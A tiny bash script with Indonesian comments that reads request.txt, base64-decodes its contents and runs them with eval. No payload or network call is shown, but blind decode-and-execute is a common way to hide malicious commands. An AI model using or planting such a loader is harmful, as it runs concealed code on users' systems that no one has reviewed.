#!/bin/bash
# Membaca isi file hasil encode
ENCODED_CONTENT=$(cat request.txt)

# Mengeksekusi isi file tersebut
eval "$(echo "$ENCODED_CONTENT" | base64 -d)"
